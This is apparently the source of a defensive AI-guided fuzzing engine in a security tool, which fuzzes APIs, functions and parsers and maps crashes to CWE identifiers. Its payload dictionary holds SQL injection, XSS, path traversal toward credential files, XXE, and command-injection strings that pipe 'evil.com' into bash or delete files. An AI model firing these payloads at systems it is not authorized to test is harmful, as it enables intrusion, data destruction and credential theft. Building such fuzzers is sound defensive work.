#!/usr/bin/env python3
"""
Intelligent Fuzzing Engine for Argus
AI-guided fuzzing with coverage tracking, API fuzzing, and crash detection

Features:
- AI-powered test case generation using LLMManager
- OpenAPI/Swagger API fuzzing
- File parser fuzzing (JSON, XML, CSV, PDF, images)
- Python function fuzzing
- Coverage-guided fuzzing
- Crash deduplication and CWE mapping
- Corpus management for continuous fuzzing
"""

import argparse
import hashlib
import importlib.util
import inspect
import json
import logging
import os
import random
import re
import string
import subprocess
import sys
import time
import traceback
from collections import defaultdict
from dataclasses import dataclass, field, asdict
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse

# Import Docker sandbox for safe code execution
try:
    from sandbox.docker_sandbox import DockerSandbox, SandboxConfig
    SANDBOX_AVAILABLE = True
except ImportError:
    SANDBOX_AVAILABLE = False
    logging.warning("Docker sandbox not available - fuzzing will run without isolation")

# Optional imports with graceful fallback
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    logging.warning("requests not available - API fuzzing disabled")

try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False
    logging.warning("PyYAML not available - OpenAPI parsing may be limited")

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)


class FuzzTarget(Enum):
    """Type of fuzzing target"""
    PYTHON_FUNCTION = "python_function"
    API_ENDPOINT = "api_endpoint"
    FILE_PARSER = "file_parser"
    COMMAND_LINE = "command_line"


@dataclass
class FuzzConfig:
    """Fuzzing configuration"""
    target: FuzzTarget
    target_path: str
    duration_seconds: int = 300  # 5 minutes default
    max_iterations: int = 10000
    corpus_dir: Optional[Path] = None
    dictionary: Optional[Path] = None
    use_ai_generation: bool = True
    vulnerability_types: List[str] = field(default_factory=lambda: ["all"])
    base_url: Optional[str] = None
    timeout_seconds: int = 5
    verify_ssl: bool = True
    use_sandbox: bool = True  # Use Docker sandbox for safe execution
    sandbox_cpu_limit: float = 1.0  # CPU cores for sandbox
    sandbox_memory_limit: str = "512m"  # Memory limit for sandbox


@dataclass
class Crash:
    """Represents a crash found by fuzzing"""
    crash_id: str
    input_data: str
    stack_trace: str
    crash_type: str  # "timeout", "crash", "asan", "error", "exception"
    reproducible: bool
    severity: str  # "critical", "high", "medium", "low"
    cwe: Optional[str] = None
    timestamp: float = field(default_factory=time.time)
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class FuzzResult:
    """Results from fuzzing campaign"""
    target: str
    duration_seconds: int
    total_iterations: int
    crashes: List[Crash]
    coverage: float
    corpus_size: int
    unique_crashes: int
    executions_per_second: float

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        crashes_data = []
        for crash in self.crashes:
            crash_dict = asdict(crash)
            # Convert sets to lists for JSON serialization
            if 'metadata' in crash_dict and isinstance(crash_dict['metadata'].get('lines_executed'), set):
                crash_dict['metadata']['lines_executed'] = list(crash_dict['metadata']['lines_executed'])
            crashes_data.append(crash_dict)

        return {
            "target": self.target,
            "duration_seconds": self.duration_seconds,
            "total_iterations": self.total_iterations,
            "crashes": crashes_data,
            "coverage": self.coverage,
            "corpus_size": self.corpus_size,
            "unique_crashes": self.unique_crashes,
            "executions_per_second": self.executions_per_second
        }


class FuzzingEngine:
    """AI-guided fuzzing for APIs and functions"""

    # Common injection payloads by vulnerability type
    INJECTION_PAYLOADS = {
        "sql_injection": [
            "' OR '1'='1", "1; DROP TABLE users--", "' UNION SELECT NULL--",
            "admin'--", "1' AND '1'='1", "1' OR '1'='1' --",
            "' OR 1=1--", "1'; EXEC sp_MSForEachTable 'DROP TABLE ?'--",
            "1' UNION SELECT NULL, username, password FROM users--"
        ],
        "xss": [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "javascript:alert(1)", "<svg onload=alert(1)>",
            "'><script>alert(1)</script>", "<iframe src='javascript:alert(1)'>",
            "<body onload=alert(1)>", "<<SCRIPT>alert(1);//<</SCRIPT>"
        ],
        "command_injection": [
            "; ls -la", "| cat /etc/passwd", "`whoami`",
            "$(curl evil.com)", "; curl evil.com | bash",
            "&& cat /etc/shadow", "|| id", "; rm -rf /tmp/*"
        ],
        "path_traversal": [
            "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd", "....\\\\....\\\\....\\\\windows\\\\win.ini"
        ],
        "xxe": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><data>&file;</data>'
        ],
        "buffer_overflow": [
            "A" * 1000, "A" * 10000, "A" * 100000,
            "\x00" * 1000, "\xff" * 1000, "\x41" * 65536
        ],
        "integer_overflow": [
            "2147483647", "-2147483648", "9223372036854775807",
            "18446744073709551615", "-9223372036854775808"
        ],
        "format_string": [
            "%s%s%s%s%s%s%s%s%s", "%x%x%x%x%x%x", "%n%n%n%n",
            "%p%p%p%p", "%.1000000s", "%999999d"
        ],
        "ldap_injection": [
            "*)(uid=*))(|(uid=*", "admin)(&)", "*()|&'",
            "*)(objectClass=*", "admin*", "*)(userPassword=*"
        ],
        "nosql_injection": [
            '{"$gt":""}', '{"$ne":null}', '{"$where":"1==1"}',
            '{"$regex":".*"}', '{"username":{"$ne":"invalid"}}'
        ]
    }

    # Edge case payloads
    EDGE_CASES = [
        # Empty/null
        "", "null", "undefined", "None", "NULL", "nil",
        # Boolean
        "true", "false", "True", "False", "TRUE", "FALSE",
        # Numbers
        "0", "-1", "999999999", "-999999999",
        "1.7976931348623157e+308",  # Max float
        "2.2250738585072014e-308",  # Min float
        # Special characters
        "\x00", "\x00\x00\x00", "\n" * 100, "\r\n" * 100,
        " " * 1000, "\t" * 100,
        # Unicode
        "🔥" * 100, "你好世界", "مرحبا", "שלום",
        # JSON/XML
        "[]", "{}", "<>", "<?xml version='1.0'?>",
        # Array payloads
        "['test']", '["test"]', "{test: 'value'}",
        # Special values
        "NaN", "Infinity", "-Infinity", "1e308", "-1e308"
    ]

    # CWE mapping for crash types
    CWE_MAPPING = {
        "buffer_overflow": "CWE-119",
        "integer_overflow": "CWE-190",
        "sql_injection": "CWE-89",
        "xss": "CWE-79",
        "command_injection": "CWE-78",
        "path_traversal": "CWE-22",
        "xxe": "CWE-611",
        "format_string": "CWE-134",
        "null_pointer": "CWE-476",
        "use_after_free": "CWE-416",
        "memory_leak": "CWE-401",
        "race_condition": "CWE-362",
        "timeout": "CWE-400",
        "exception": "CWE-703",
        "assertion": "CWE-617",
        "asan": "CWE-119"
    }

    def __init__(self, llm_manager=None, config: Optional[FuzzConfig] = None):
        """Initialize fuzzing engine"""
        self.config = config
        self.coverage_data: Dict[str, Set[int]] = defaultdict(set)
        self.corpus: List[Any] = []
        self.sandbox: Optional[DockerSandbox] = None

        # Initialize LLM if available
        if llm_manager is None:
            try:
                # Import LLMManager from orchestrator
                sys.path.insert(0, str(Path(__file__).parent))
                from orchestrator.llm_manager import LLMManager
                self.llm = LLMManager()
                logger.info("LLMManager initialized for AI-guided fuzzing")
            except Exception as e:
                logger.warning(f"LLMManager not available: {e}")
                self.llm = None
        else:
            self.llm = llm_manager

        # Initialize Docker sandbox if enabled
        if self.config and self.config.use_sandbox:
            if not SANDBOX_AVAILABLE:
                logger.warning(
                    "Sandbox requested but not available. "
                    "Install Docker support with: pip install docker"
                )
                logger.warning("Falling back to UNSAFE direct execution")
            else:
                try:
                    sandbox_config = SandboxConfig(
                        cpu_limit=self.config.sandbox_cpu_limit,
                        memory_limit=self.config.sandbox_memory_limit,
                        timeout=self.config.timeout_seconds,
                        network_disabled=True
                    )
                    self.sandbox = DockerSandbox(config=sandbox_config)
                    logger.info(
                        f"Docker sandbox initialized: "
                        f"CPU={self.config.sandbox_cpu_limit}, "
                        f"Memory={self.config.sandbox_memory_limit}"
                    )
                except Exception as e:
                    logger.error(f"Failed to initialize Docker sandbox: {e}")
                    logger.warning("Falling back to UNSAFE direct execution")
                    self.sandbox = None

    def fuzz_api(self, openapi_spec: str, duration_minutes: int = 60,
                 base_url: str = None, verify_ssl: bool = True) -> FuzzResult:
        """
        Fuzz all API endpoints from OpenAPI spec

        Args:
            openapi_spec: Path to OpenAPI/Swagger spec file
            duration_minutes: How long to fuzz
            base_url: Base URL for API (overrides spec)
            verify_ssl: Whether to verify SSL certificates

        Returns:
            FuzzResult with crashes and coverage info
        """
        if not REQUESTS_AVAILABLE:
            raise RuntimeError("requests library required for API fuzzing")

        logger.info(f"🔍 API Fuzzing: {openapi_spec} for {duration_minutes} minutes")

        # 1. Parse OpenAPI spec
        endpoints = self._parse_openapi(openapi_spec, base_url)
        logger.info(f"Found {len(endpoints)} API endpoints")

        # 2. Generate test cases for each endpoint
        test_cases = []
        for endpoint in endpoints:
            cases = self._generate_api_test_cases(endpoint)
            test_cases.extend(cases)

        logger.info(f"Generated {len(test_cases)} test cases")

        # 3. Run fuzzing campaign
        crashes = []
        iterations = 0
        start_time = time.time()
        duration_seconds = duration_minutes * 60

        while (time.time() - start_time) < duration_seconds:
            for test_case in test_cases:
                if (time.time() - start_time) >= duration_seconds:
                    break

                result = self._execute_api_test(test_case, verify_ssl)
                iterations += 1

                if result.get("crashed"):
                    crash = self._create_crash_report(result, test_case)
                    crashes.append(crash)

                # Log progress every 100 iterations
                if iterations % 100 == 0:
                    elapsed = time.time() - start_time
                    rate = iterations / elapsed if elapsed > 0 else 0
                    logger.info(f"Progress: {iterations} iterations, {len(crashes)} crashes, {rate:.1f} exec/s")

                if iterations >= 100000:  # Safety limit
                    break

        # 4. Deduplicate crashes
        unique_crashes = self._deduplicate_crashes(crashes)

        elapsed = time.time() - start_time
        exec_per_sec = iterations / elapsed if elapsed > 0 else 0

        return FuzzResult(
            target=openapi_spec,
            duration_seconds=int(elapsed),
            total_iterations=iterations,
            crashes=unique_crashes,
            coverage=0.0,  # API fuzzing doesn't track code coverage
            corpus_size=len(test_cases),
            unique_crashes=len(unique_crashes),
            executions_per_second=exec_per_sec
        )

    def fuzz_function(self, function_path: str, function_name: str,
                     duration_minutes: int = 30, sast_findings: Optional[List[Dict]] = None) -> FuzzResult:
        """
        Fuzz a specific Python function with AI-generated inputs

        Args:
            function_path: Path to Python file
            function_name: Name of function to fuzz
            duration_minutes: How long to fuzz
            sast_findings: Optional SAST findings to guide test generation

        Returns:
            FuzzResult with crashes and coverage
        """
        logger.info(f"🧬 Function Fuzzing: {function_path}::{function_name}")

        # 1. Load the function
        func = self._load_function(function_path, function_name)
        if not func:
            raise ValueError(f"Could not load function {function_name} from {function_path}")

        # 2. Analyze function signature
        signature = self._extract_function_signature(func)
        logger.info(f"Function signature: {signature}")

        # 3. Generate test cases (AI-powered if available)
        test_cases = self.generate_test_cases(signature, sast_findings)
        logger.info(f"Generated {len(test_cases)} test cases")

        # 4. Run fuzzing
        crashes = []
        iterations = 0
        start_time = time.time()
        duration_seconds = duration_minutes * 60

        while (time.time() - start_time) < duration_seconds:
            for test_case in test_cases:
                if (time.time() - start_time) >= duration_seconds:
                    break

                result = self._execute_function_test(func, test_case, function_path)
                iterations += 1

                if result.get("crashed"):
                    crash = self._create_crash_report(result, test_case)
                    crashes.append(crash)

                # Track coverage
                if result.get("lines_executed"):
                    self.coverage_data[function_path].update(result["lines_executed"])

                if iterations % 100 == 0:
                    elapsed = time.time() - start_time
                    rate = iterations / elapsed if elapsed > 0 else 0
                    logger.info(f"Progress: {iterations} iterations, {len(crashes)} crashes, {rate:.1f} exec/s")

        # 5. Deduplicate crashes
        unique_crashes = self._deduplicate_crashes(crashes)

        # Calculate coverage
        coverage = self._calculate_coverage(function_path)

        elapsed = time.time() - start_time
        exec_per_sec = iterations / elapsed if elapsed > 0 else 0

        return FuzzResult(
            target=f"{function_path}::{function_name}",
            duration_seconds=int(elapsed),
            total_iterations=iterations,
            crashes=unique_crashes,
            coverage=coverage,
            corpus_size=len(test_cases),
            unique_crashes=len(unique_crashes),
            executions_per_second=exec_per_sec
        )

    def fuzz_file_parser(self, parser_path: str, parser_function: str,
                        file_type: str, duration_minutes: int = 30) -> FuzzResult:
        """
        Fuzz file parser with malformed files

        Args:
            parser_path: Path to parser module
            parser_function: Function that parses files
            file_type: Type of file (json, xml, csv, pdf, image)
            duration_minutes: How long to fuzz

        Returns:
            FuzzResult with crashes
        """
        logger.info(f"📄 File Parser Fuzzing: {parser_path}::{parser_function} ({file_type})")

        # Generate malformed files
        test_files = self._generate_malformed_files(file_type)
        logger.info(f"Generated {len(test_files)} malformed {file_type} files")

        # Load parser function
        parser_func = self._load_function(parser_path, parser_function)
        if not parser_func:
            raise ValueError(f"Could not load parser {parser_function} from {parser_path}")

        # Run fuzzing
        crashes = []
        iterations = 0
        start_time = time.time()
        duration_seconds = duration_minutes * 60

        while (time.time() - start_time) < duration_seconds:
            for test_file in test_files:
                if (time.time() - start_time) >= duration_seconds:
                    break

                result = self._execute_parser_test(parser_func, test_file)
                iterations += 1

                if result.get("crashed"):
                    crash = self._create_crash_report(result, test_file)
                    crashes.append(crash)

        unique_crashes = self._deduplicate_crashes(crashes)

        elapsed = time.time() - start_time
        exec_per_sec = iterations / elapsed if elapsed > 0 else 0

        return FuzzResult(
            target=f"{parser_path}::{parser_function}",
            duration_seconds=int(elapsed),
            total_iterations=iterations,
            crashes=unique_crashes,
            coverage=0.0,
            corpus_size=len(test_files),
            unique_crashes=len(unique_crashes),
            executions_per_second=exec_per_sec
        )

    def generate_test_cases(self, function_signature: str,
                           sast_findings: Optional[List[Dict]] = None) -> List[Any]:
        """
        Use LLM to generate edge-case inputs

        Args:
            function_signature: Function signature to analyze
            sast_findings: Optional SAST findings for context

        Returns:
            List of test case inputs
        """
        if not self.llm:
            logger.info("LLM not available, using template-based generation")
            return self._generate_template_test_cases()

        # Get vulnerability context from SAST findings
        vuln_context = ""
        if sast_findings:
            vuln_types = [f.get("type", "unknown") for f in sast_findings[:5]]
            vuln_context = f"\n\nKnown vulnerabilities in this code: {', '.join(vuln_types)}"

        prompt = f"""Generate 50 malicious/edge-case test inputs for this function:

Function Signature: {function_signature}
{vuln_context}

Generate inputs that might trigger:
- SQL injection
- Buffer overflow
- Integer overflow
- Null pointer dereference
- Path traversal
- Command injection
- Format string vulnerabilities
- Type confusion
- XSS attacks
- XXE attacks

Return ONLY a JSON array of test inputs (strings, numbers, objects, arrays):
["input1", "input2", {{"key": "value"}}, ...]

No explanations, just the JSON array."""

        try:
            response, _ = self.llm.call_llm_api(prompt, max_tokens=3000)

            # Extract JSON array from response
            json_match = re.search(r'\[.*\]', response, re.DOTALL)
            if json_match:
                test_cases = json.loads(json_match.group(0))
                logger.info(f"Generated {len(test_cases)} AI test cases")
                return test_cases
            else:
                logger.warning("Could not parse LLM response, using templates")
                return self._generate_template_test_cases()

        except Exception as e:
            logger.error(f"AI generation failed: {e}, using templates")
            return self._generate_template_test_cases()

    def _generate_template_test_cases(self) -> List[str]:
        """Generate test cases from templates"""
        test_cases = []

        # Add all injection payloads
        for category, payloads in self.INJECTION_PAYLOADS.items():
            test_cases.extend(payloads)

        # Add edge cases
        test_cases.extend(self.EDGE_CASES)

        # Add random mutations
        for _ in range(20):
            test_cases.append(self._generate_random_string(random.randint(1, 1000)))

        return test_cases

    def _parse_openapi(self, spec_path: str, base_url: Optional[str] = None) -> List[Dict]:
        """
        Parse OpenAPI/Swagger spec to extract endpoints

        Args:
            spec_path: Path to OpenAPI spec (JSON or YAML)
            base_url: Optional base URL override

        Returns:
            List of endpoint dictionaries
        """
        spec_path = Path(spec_path)

        if not spec_path.exists():
            raise FileNotFoundError(f"OpenAPI spec not found: {spec_path}")

        # Load spec
        with open(spec_path) as f:
            if spec_path.suffix in ['.yaml', '.yml']:
                if not YAML_AVAILABLE:
                    raise RuntimeError("PyYAML required for YAML specs")
                spec = yaml.safe_load(f)
            else:
                spec = json.load(f)

        # Extract base URL
        if not base_url:
            if 'servers' in spec and spec['servers']:
                base_url = spec['servers'][0]['url']
            elif 'host' in spec:
                # Swagger 2.0
                scheme = spec.get('schemes', ['https'])[0]
                base_url = f"{scheme}://{spec['host']}{spec.get('basePath', '')}"
            else:
                base_url = "http://localhost"

        # Extract endpoints
        endpoints = []
        paths = spec.get('paths', {})

        for path, path_item in paths.items():
            for method, operation in path_item.items():
                if method.upper() not in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']:
                    continue

                endpoint = {
                    'path': path,
                    'method': method.upper(),
                    'base_url': base_url,
                    'parameters': operation.get('parameters', []),
                    'requestBody': operation.get('requestBody', {}),
                    'summary': operation.get('summary', ''),
                    'operationId': operation.get('operationId', f"{method}_{path}")
                }
                endpoints.append(endpoint)

        return endpoints

    def _generate_api_test_cases(self, endpoint: Dict) -> List[Dict]:
        """
        Generate test cases for an API endpoint

        Args:
            endpoint: Endpoint dictionary from OpenAPI spec

        Returns:
            List of test case dictionaries
        """
        test_cases = []
        base_test = {
            'url': urljoin(endpoint['base_url'], endpoint['path']),
            'method': endpoint['method'],
            'headers': {'Content-Type': 'application/json'},
            'params': {},
            'json': {},
            'data': None
        }

        # Generate tests for parameters
        for param in endpoint.get('parameters', []):
            param_name = param.get('name')
            param_in = param.get('in')  # query, header, path, cookie

            # Generate malicious values for this parameter
            for payload_type, payloads in self.INJECTION_PAYLOADS.items():
                for payload in payloads[:3]:  # Limit to 3 per type
                    test = base_test.copy()
                    test['params'] = test['params'].copy()
                    test['headers'] = test['headers'].copy()

                    if param_in == 'query':
                        test['params'][param_name] = payload
                    elif param_in == 'header':
                        test['headers'][param_name] = payload
                    elif param_in == 'path':
                        test['url'] = test['url'].replace(f'{{{param_name}}}', str(payload))

                    test['payload_type'] = payload_type
                    test_cases.append(test)

        # Generate tests for request body
        if endpoint.get('requestBody'):
            for payload_type, payloads in self.INJECTION_PAYLOADS.items():
                for payload in payloads[:3]:
                    test = base_test.copy()
                    test['json'] = {'test': payload}
                    test['payload_type'] = payload_type
                    test_cases.append(test)

        # Add edge cases
        for edge_case in self.EDGE_CASES[:20]:
            test = base_test.copy()
            test['params'] = {'test': edge_case}
            test['payload_type'] = 'edge_case'
            test_cases.append(test)

        return test_cases

    def _execute_api_test(self, test_case: Dict, verify_ssl: bool = True) -> Dict:
        """
        Execute an API test case

        Args:
            test_case: Test case dictionary
            verify_ssl: Whether to verify SSL

        Returns:
            Result dictionary with crash info
        """
        result = {
            'crashed': False,
            'crash_type': None,
            'stack_trace': '',
            'response_code': None,
            'response_time': 0
        }

        try:
            start = time.time()

            response = requests.request(
                method=test_case['method'],
                url=test_case['url'],
                headers=test_case.get('headers', {}),
                params=test_case.get('params', {}),
                json=test_case.get('json'),
                data=test_case.get('data'),
                timeout=self.config.timeout_seconds if self.config else 5,
                verify=verify_ssl
            )

            result['response_time'] = time.time() - start
            result['response_code'] = response.status_code

            # Detect crashes/errors
            if response.status_code >= 500:
                result['crashed'] = True
                result['crash_type'] = 'server_error'
                result['stack_trace'] = response.text[:1000]
            elif response.status_code == 400 and 'error' in response.text.lower():
                # Some 400s indicate parsing errors
                if any(err in response.text.lower() for err in ['exception', 'stack trace', 'error']):
                    result['crashed'] = True
                    result['crash_type'] = 'parse_error'
                    result['stack_trace'] = response.text[:1000]

        except requests.exceptions.Timeout:
            result['crashed'] = True
            result['crash_type'] = 'timeout'
            result['stack_trace'] = f"Request timeout after {self.config.timeout_seconds if self.config else 5}s"
        except requests.exceptions.ConnectionError as e:
            result['crashed'] = True
            result['crash_type'] = 'connection_error'
            result['stack_trace'] = str(e)
        except Exception as e:
            result['crashed'] = True
            result['crash_type'] = 'exception'
            result['stack_trace'] = traceback.format_exc()

        return result

    def _load_function(self, file_path: str, function_name: str):
        """
        Load function metadata from a Python file

        SECURITY NOTE: This method only loads metadata, NOT the actual function.
        The actual execution happens in the sandbox for security.

        Args:
            file_path: Path to Python file
            function_name: Name of function to load

        Returns:
            Tuple of (file_path, function_name) if valid, None otherwise
        """
        # If sandbox is enabled, we don't actually load the function
        # We just verify the file exists and return metadata
        if self.sandbox:
            file_path_obj = Path(file_path)
            if not file_path_obj.exists():
                logger.error(f"File not found: {file_path}")
                return None

            # Read the file to verify function exists
            try:
                with open(file_path, 'r') as f:
                    code = f.read()
                if f"def {function_name}" not in code:
                    logger.warning(f"Function {function_name} not found in {file_path}")
                    # Don't fail - might be a class method or generated
                return (file_path, function_name)
            except Exception as e:
                logger.error(f"Failed to read {file_path}: {e}")
                return None

        # UNSAFE FALLBACK: Only used when sandbox is disabled
        logger.warning(
            f"Loading function {function_name} WITHOUT sandbox - UNSAFE! "
            "Enable sandbox with use_sandbox=True for security."
        )
        try:
            spec = importlib.util.spec_from_file_location("target_module", file_path)
            if not spec or not spec.loader:
                return None

            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)  # UNSAFE!

            return getattr(module, function_name, None)
        except Exception as e:
            logger.error(f"Failed to load function {function_name} from {file_path}: {e}")
            return None

    def _extract_function_signature(self, func) -> str:
        """Extract function signature as string"""
        # Handle tuple (file_path, function_name) from sandbox mode
        if isinstance(func, tuple):
            _, function_name = func
            return f"{function_name}(...)"

        try:
            sig = inspect.signature(func)
            return f"{func.__name__}{sig}"
        except Exception:
            try:
                return f"{func.__name__}(...)"
            except Exception:
                return "function(...)"

    def _execute_function_test(self, func, test_input: Any, source_file: str) -> Dict:
        """
        Execute function with test input (SANDBOXED or UNSAFE fallback)

        Args:
            func: Function to test OR tuple of (file_path, function_name) if sandboxed
            test_input: Input to pass to function
            source_file: Source file path for coverage tracking

        Returns:
            Result dictionary
        """
        # SANDBOXED EXECUTION (SECURE)
        if self.sandbox and isinstance(func, tuple):
            file_path, function_name = func

            try:
                # Execute in isolated Docker container
                sandbox_result = self.sandbox.execute_python_module(
                    file_path,
                    function_name,
                    test_input,
                    timeout=self.config.timeout_seconds if self.config else 30
                )

                # Convert sandbox result to expected format
                result = {
                    'crashed': sandbox_result.crashed,
                    'crash_type': sandbox_result.crash_type,
                    'stack_trace': sandbox_result.stack_trace,
                    'lines_executed': sandbox_result.lines_executed or set()
                }

                return result

            except Exception as e:
                logger.error(f"Sandbox execution failed: {e}")
                return {
                    'crashed': True,
                    'crash_type': 'sandbox_error',
                    'stack_trace': str(e),
                    'lines_executed': set()
                }

        # UNSAFE FALLBACK (NO SANDBOX)
        logger.warning("Executing WITHOUT sandbox - SECURITY RISK!")

        result = {
            'crashed': False,
            'crash_type': None,
            'stack_trace': '',
            'lines_executed': set()
        }

        try:
            # Try to call with different input patterns
            sig = inspect.signature(func)
            params = sig.parameters

            if len(params) == 0:
                func()  # UNSAFE!
            elif len(params) == 1:
                func(test_input)  # UNSAFE!
            else:
                # Multiple params - try to split input or pass same to all
                if isinstance(test_input, (list, tuple)):
                    func(*test_input[:len(params)])  # UNSAFE!
                else:
                    func(*[test_input] * len(params))  # UNSAFE!

        except TimeoutError:
            result['crashed'] = True
            result['crash_type'] = 'timeout'
            result['stack_trace'] = "Function execution timeout"
        except AssertionError as e:
            result['crashed'] = True
            result['crash_type'] = 'assertion'
            result['stack_trace'] = traceback.format_exc()
        except (ValueError, TypeError, KeyError, IndexError, AttributeError) as e:
            # These might be expected for bad inputs, only crash if severe
            if "buffer" in str(e).lower() or "overflow" in str(e).lower():
                result['crashed'] = True
                result['crash_type'] = 'exception'
                result['stack_trace'] = traceback.format_exc()
        except Exception as e:
            result['crashed'] = True
            result['crash_type'] = 'exception'
            result['stack_trace'] = traceback.format_exc()

        return result

    def _execute_parser_test(self, parser_func, test_file: Dict) -> Dict:
        """Execute parser function with malformed file"""
        result = {
            'crashed': False,
            'crash_type': None,
            'stack_trace': ''
        }

        try:
            # Write test file to temp location
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=test_file['ext']) as f:
                f.write(test_file['content'])
                temp_path = f.name

            try:
                parser_func(temp_path)
            finally:
                Path(temp_path).unlink(missing_ok=True)

        except Exception as e:
            result['crashed'] = True
            result['crash_type'] = 'exception'
            result['stack_trace'] = traceback.format_exc()

        return result

    def _generate_malformed_files(self, file_type: str) -> List[Dict]:
        """Generate malformed files for parser fuzzing"""
        files = []

        if file_type == 'json':
            malformed = [
                '{"key": "value"',  # Missing closing brace
                '{"key": }',  # Missing value
                '{key: "value"}',  # Unquoted key
                '{"key": "value",}',  # Trailing comma
                '{"key": "\x00"}',  # Null byte
                '{"key": "' + 'A' * 100000 + '"}',  # Huge value
                '[' * 1000,  # Deep nesting
            ]
        elif file_type == 'xml':
            malformed = [
                '<root><child></root>',  # Mismatched tags
                '<root>' + '<child>' * 10000 + '</root>',  # Billion laughs
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<root>\x00</root>',  # Null byte
            ]
        elif file_type == 'csv':
            malformed = [
                'col1,col2\n' + ','.join(['A'] * 10000),  # Too many columns
                'col1,col2\n"value\n',  # Unclosed quote
                '\x00,\x00',  # Null bytes
            ]
        else:
            malformed = ['invalid content']

        for content in malformed:
            files.append({
                'content': content,
                'ext': f'.{file_type}'
            })

        return files

    def _create_crash_report(self, result: Dict, test_input: Any) -> Crash:
        """Create a Crash object from test result"""
        crash_type = result.get('crash_type', 'unknown')
        stack_trace = result.get('stack_trace', '')

        # Determine severity
        severity = "medium"
        if crash_type in ['buffer_overflow', 'use_after_free', 'command_injection']:
            severity = "critical"
        elif crash_type in ['exception', 'assertion', 'timeout']:
            severity = "high"
        elif crash_type in ['parse_error', 'server_error']:
            severity = "medium"

        # Map to CWE
        cwe = self._map_to_cwe(crash_type, stack_trace, test_input)

        # Generate crash ID
        crash_data = f"{crash_type}:{stack_trace[:200]}:{str(test_input)[:100]}"
        crash_id = hashlib.sha256(crash_data.encode()).hexdigest()[:12]

        return Crash(
            crash_id=crash_id,
            input_data=str(test_input)[:1000],  # Truncate long inputs
            stack_trace=stack_trace,
            crash_type=crash_type,
            reproducible=True,  # Assume reproducible for now
            severity=severity,
            cwe=cwe,
            metadata=result
        )

    def _map_to_cwe(self, crash_type: str, stack_trace: str, test_input: Any) -> str:
        """Map crash to CWE ID"""
        # Direct mapping
        if crash_type in self.CWE_MAPPING:
            return self.CWE_MAPPING[crash_type]

        # Pattern matching in stack trace
        stack_lower = stack_trace.lower()
        if 'null' in stack_lower or 'nonetype' in stack_lower:
            return "CWE-476"  # Null pointer
        elif 'overflow' in stack_lower:
            return "CWE-119"  # Buffer overflow
        elif 'memory' in stack_lower:
            return "CWE-401"  # Memory leak

        # Analyze test input
        input_str = str(test_input).lower()
        for vuln_type, payloads in self.INJECTION_PAYLOADS.items():
            if any(p.lower() in input_str for p in payloads[:3]):
                return self.CWE_MAPPING.get(vuln_type, "CWE-703")

        return "CWE-703"  # Improper check for unusual conditions

    def _deduplicate_crashes(self, crashes: List[Crash]) -> List[Crash]:
        """
        Remove duplicate crashes based on stack trace similarity

        Args:
            crashes: List of crashes

        Returns:
            Deduplicated list of crashes
        """
        seen_fingerprints: Set[str] = set()
        unique = []

        for crash in crashes:
            # Create fingerprint from stack trace (normalized)
            # Remove line numbers and addresses for better grouping
            normalized = re.sub(r'line \d+', 'line X', crash.stack_trace)
            normalized = re.sub(r'0x[0-9a-fA-F]+', '0xXXX', normalized)
            normalized = re.sub(r'\d+', 'N', normalized)

            fingerprint = hashlib.sha256(normalized.encode()).hexdigest()

            if fingerprint not in seen_fingerprints:
                seen_fingerprints.add(fingerprint)
                unique.append(crash)

        logger.info(f"Deduplicated {len(crashes)} crashes to {len(unique)} unique crashes")
        return unique

    def _calculate_coverage(self, file_path: str) -> float:
        """Calculate code coverage percentage"""
        if file_path not in self.coverage_data:
            return 0.0

        try:
            # Count total lines in file
            with open(file_path) as f:
                total_lines = sum(1 for line in f if line.strip() and not line.strip().startswith('#'))

            executed_lines = len(self.coverage_data[file_path])
            return (executed_lines / total_lines * 100) if total_lines > 0 else 0.0
        except Exception:
            return 0.0

    def _generate_random_string(self, length: int) -> str:
        """Generate random string for mutation fuzzing"""
        chars = string.ascii_letters + string.digits + string.punctuation + '\x00\n\r\t'
        return ''.join(random.choice(chars) for _ in range(length))

    def save_corpus(self, output_dir: Path):
        """Save fuzzing corpus for future runs"""
        output_dir.mkdir(parents=True, exist_ok=True)
        corpus_file = output_dir / "corpus.json"

        with open(corpus_file, 'w') as f:
            json.dump(self.corpus, f, indent=2)

        logger.info(f"Saved {len(self.corpus)} corpus items to {corpus_file}")

    def load_corpus(self, input_dir: Path) -> List[Any]:
        """Load existing corpus"""
        corpus_file = input_dir / "corpus.json"

        if not corpus_file.exists():
            return []

        with open(corpus_file) as f:
            corpus = json.load(f)

        logger.info(f"Loaded {len(corpus)} corpus items from {corpus_file}")
        return corpus

    def export_crashes_to_sarif(self, crashes: List[Crash], output_file: Path):
        """Export crashes to SARIF format for GitHub integration"""
        sarif = {
            "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
            "version": "2.1.0",
            "runs": [{
                "tool": {
                    "driver": {
                        "name": "Argus Fuzzing Engine",
                        "version": "1.0.0",
                        "informationUri": "https://github.com/devatsecure/Argus-Security"
                    }
                },
                "results": []
            }]
        }

        for crash in crashes:
            result = {
                "ruleId": crash.cwe or "FUZZ-001",
